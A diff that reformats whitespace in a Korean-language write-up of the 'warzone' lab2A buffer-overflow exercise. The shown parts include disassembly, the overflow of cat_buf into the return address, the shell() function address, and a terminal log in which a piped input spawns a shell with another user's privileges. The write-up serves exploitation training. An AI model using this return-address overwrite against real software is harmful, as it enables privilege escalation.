@@ -122,7 +122,7 @@
 ```
 - for문을 반복하면서 word_buf 입력값의 첫 byte를 복사하여 cat_buf 에 순차적으로 붙여넣음
 ```
-	...
+    ...
     0x08048777 <+90>:    mov    eax,DWORD PTR [ebp-0x18]
     0x0804877a <+93>:    movzx  edx,BYTE PTR [ebp-0x28]
     0x0804877e <+97>:    mov    BYTE PTR [eax],dl
@@ -133,12 +133,12 @@
 ```
 - cat_buf 의 위치는 word_buf 위치(ebp-0x28)로부터 20byte(0x14) 떨어져 있으므로 ebp-0x14 가 되며 cat_buf 값이 20byte가 넘어가게 되면 SFP, RET 주소를 순차적으로 덮어쓰게 됨
 ```
-  	0x0804871d <+0>:     push   ebp
-  	0x0804871e <+1>:     mov    ebp,esp
-   	0x08048720 <+3>:     sub    esp,0x38
-   	0x08048723 <+6>:     lea    eax,[ebp-0x28]
-   	0x08048726 <+9>:     add    eax,0x14
-   	0x08048729 <+12>:    mov    DWORD PTR [ebp-0x18],eax
+    0x0804871d <+0>:     push   ebp
+    0x0804871e <+1>:     mov    ebp,esp
+    0x08048720 <+3>:     sub    esp,0x38
+    0x08048723 <+6>:     lea    eax,[ebp-0x28]
+    0x08048726 <+9>:     add    eax,0x14
+    0x08048729 <+12>:    mov    DWORD PTR [ebp-0x18],eax
     ...
 ```
 
@@ -152,9 +152,9 @@
 ```
 - 쉘을 띄워줄 shell()함수의 주소를 확인하여 리턴주소로 사용함
 ```
-	gdb-peda$ p shell
-	$2 = {<text variable, no debug info>} 0x80486fd <shell>
-	gdb-peda$
+    gdb-peda$ p shell
+    $2 = {<text variable, no debug info>} 0x80486fd <shell>
+    gdb-peda$
 ```
 - 다음 코드를 실행하여 입력 데이터를 생성함
 ```python
@@ -173,11 +173,11 @@
 - 생성된 입력값을 전달하여 프로그램을 실행해주면 됨
   (※ 파이프는 cat 명령의 결과값만 전달하기 때문에 ;cat 명령을 추가하여 쉘이 input을 받을 수 있도록 해줘야 함)
 ```
-	lab2A@warzone:/levels/lab02$ python /tmp/lab2a.py > /tmp/lab2a_input
-	lab2A@warzone:/levels/lab02$ (cat /tmp/lab2a_input;cat) | ./lab2A
-	Input 10 words:
-	Failed to read word
-	You got it
-	id
-	uid=1008(lab2A) gid=1009(lab2A) euid=1009(lab2end) groups=1010(lab2end),1001(gameuser),1009(lab2A)
+    lab2A@warzone:/levels/lab02$ python /tmp/lab2a.py > /tmp/lab2a_input
+    lab2A@warzone:/levels/lab02$ (cat /tmp/lab2a_input;cat) | ./lab2A
+    Input 10 words:
+    Failed to read word
+    You got it
+    id
+    uid=1008(lab2A) gid=1009(lab2A) euid=1009(lab2end) groups=1010(lab2end),1001(gameuser),1009(lab2A)
 ```
